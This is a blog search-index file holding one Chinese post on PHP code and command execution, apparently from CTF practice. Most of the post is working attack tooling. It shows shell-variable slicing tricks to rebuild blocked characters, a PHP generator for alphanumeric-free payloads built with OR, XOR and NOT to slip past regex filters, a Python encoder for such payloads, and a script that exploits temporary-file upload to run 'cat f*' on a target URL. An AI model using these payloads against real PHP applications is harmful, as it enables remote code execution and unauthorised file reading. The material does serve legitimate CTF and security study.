<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php代码/命令执行</title>
      <link href="/2021/09/29/php-dai-ma-ming-ling-zhi-xing/"/>
      <url>/2021/09/29/php-dai-ma-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="1-利用系统变量"><a href="#1-利用系统变量" class="headerlink" title="1.利用系统变量"></a>1.利用系统变量</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#命令执行，且题目过滤了小写字母#$PATH=环境变量，$PWD=当前目录变量,$SHLVL=1，$PHP_VERSION=php版本，$RANDOM=1000-100000内的数字#${?}=上次命令的执行结果，${#?}=上次命令的执行结果的长度#还有一个$USER,$TERM,$HOSTNAME等#${#RANDOM},获取RANDOM生成的随机数的位数。即#的用途是获取${RANDOM}执行后结果的长度#利用的是shell的格式化字符串#${PATH:5:1}，即读取环境变量的第五位字符；${PATH:~A}，即读取环境变量的最后一位字符#ls${PATH:5:1}${PATH:2:1}#如果当前目录是/var/www/html,下面命令为:nl${IFS}????.???${PATH:~A}${PWD:~A}${IFS}????.???<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-无字母数字getshell"><a href="#2-无字母数字getshell" class="headerlink" title="2.无字母数字getshell"></a>2.无字母数字getshell</h2><h3 id="2-1-利用取反、异或、或操作制造不可见字符"><a href="#2-1-利用取反、异或、或操作制造不可见字符" class="headerlink" title="2.1.利用取反、异或、或操作制造不可见字符"></a>2.1.利用取反、异或、或操作制造不可见字符</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*/</span><span class="token comment">//或</span><span class="token keyword">function</span> <span class="token function-definition function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//异或</span><span class="token keyword">function</span> <span class="token function-definition function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//取反</span><span class="token keyword">function</span> <span class="token function-definition function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'[+]your function: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$system</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'[+]your command: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$command</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'[*] (~'</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">')(~'</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//mode=1代表或，2代表异或，3代表取反</span><span class="token comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span><span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">,</span> <span class="token variable">$preg</span><span class="token operator">=</span><span class="token string single-quoted-string">'/[0-9]/i'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">!=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$par1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>                    <span class="token variable">$par2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>                    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$par1</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$par2</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># author yu22x</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"or_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-上传临时文件"><a href="#2-2-上传临时文件" class="headerlink" title="2.2.上传临时文件"></a>2.2.上传临时文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span><span class="token comment">#author yu22x</span><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;"</span>files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'cat f*'</span><span class="token punctuation">}</span>response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span>html <span class="token operator">=</span> response<span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-只有4，5个字符命令执行写-反弹shell"><a href="#3-只有4，5个字符命令执行写-反弹shell" class="headerlink" title="3.只有4，5个字符命令执行写/反弹shell"></a>3.只有4，5个字符命令执行写/反弹shell</h2><h2 id="4-利用文件包含"><a href="#4-利用文件包含" class="headerlink" title="4.利用文件包含"></a>4.利用文件包含</h2><p>详见文件包含中的常见操作</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://blog.csdn.net/miuzzx">https://blog.csdn.net/miuzzx</a></p><p><a href="https://y4tacker.blog.csdn.net/">https://y4tacker.blog.csdn.net/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php代码/命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
